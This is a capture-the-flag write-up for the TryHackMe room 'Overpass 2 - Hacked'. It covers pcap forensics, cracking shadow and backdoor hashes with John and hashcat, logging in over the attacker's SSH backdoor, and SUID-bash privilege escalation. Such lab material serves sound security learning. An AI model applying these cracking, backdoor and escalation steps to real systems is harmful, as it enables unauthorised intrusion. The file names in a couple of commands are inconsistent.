# Overpass 2 - Hacked

Link: [Overpass 2 - Hacked](https://tryhackme.com/room/overpass2hacked)

## High-Level Overview

The company Overpass has been hacked. We need to investigate suspicious activity. Figure out how the attacker got in, then hack your way back into the production server.

## Tools Needed

* Wireshark
* John the Ripper
* Hashcat
* Nmap

## Walkthrough

First we began investigating the `pcapng` file with Wireshark. We will right click the first packet and click `Follow` `TCP Stream`. In the request we can see the URL of the page the attacker uploaded a reverse shell.

We can now filter out this stream and then investigate the next Stream of the first packet that appears after we apply the filter below:

```
!(tcp.stream eq 0)
```

This stream reveals the payload contents.

We can investigate the next streams by either filtering out the specific stream number or when we follow a TCP stream we can increment the stream number in the bottom right corner of the screen.

```
tcp.stream eq 3
```

In the TCP Stream 3 we can see the password revealed in plaintext, and how the attacker established persistence (`git clone https://github.com/NinjaJc01/ssh-backdoor`)

In the same stream we can see the contents of the `/etc/shadow` file. We can create a file on our own machine and then see if we can crack any using John The Ripper.

```bash
$ sudo john --wordlist=/usr/share/wordlists/fasttrack.txt shadow
```

For the next part we need to analyze the code for the backdoor. That is located in the `main.go` file of the previously discovered repository. There we can identify the hash and the salt for the backdoor.

Going back to the TCP Stream 3 of the pcap file , we can see the salt the attacker used by looking for the command `./backdoor -a`

Lets see if we can crack this hash using hashcat. First we need to investigate the source code, which points out that the hash is created using sha512, then using password + salt in that order. Hashcat wiki says that the hasmode we are looking for is 1710. To crack the hash we need to place the hash in a file and then use hashcat with the following command:

```bash
$ touch hash
$ nano hash
# paste hash in, followed by the separator :, and finally the salt
# hash:salt
$ hashcat -m 1710 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt
$ cat cracked.txt
```

Now we are ready to hack our way back in. We need to do an initial scan with nmap to see what services are running:

```bash
$ sudo nmap -T5 -vvv -sS -A -Pn -oN nmap-scan -p- MACHINE:IP
```

There are 3 ports open:

* 22 - SSH
* 80 - HTTP
* 2222 - SSH

The SSH running on port 2222 is the backdoor and we will be using it to connect using the previously identified credentials.

```bash
$ ssh james@MACHINE:IP -p 2222
```

We can see in the home folder of the user `james` our `user.txt` flag.

In order to get the root flag we need to see about escalating privileges.

Looking for files with the SUID bit set using the command

```bash
$ find / -perm -u=s -type f 2>/dev/null 
```

We see there is a binary in james home folder

```bash
/home/james/.suid_bash
```

This was likely used by the attacker in order to escalate privileges, and using GTFO Bins website we get more insight into it. We can use the command:

```bash
$ ./suid_bash -p
```

Now we have a root shell, and we can read the `root.txt` flag located in the `/root` folder.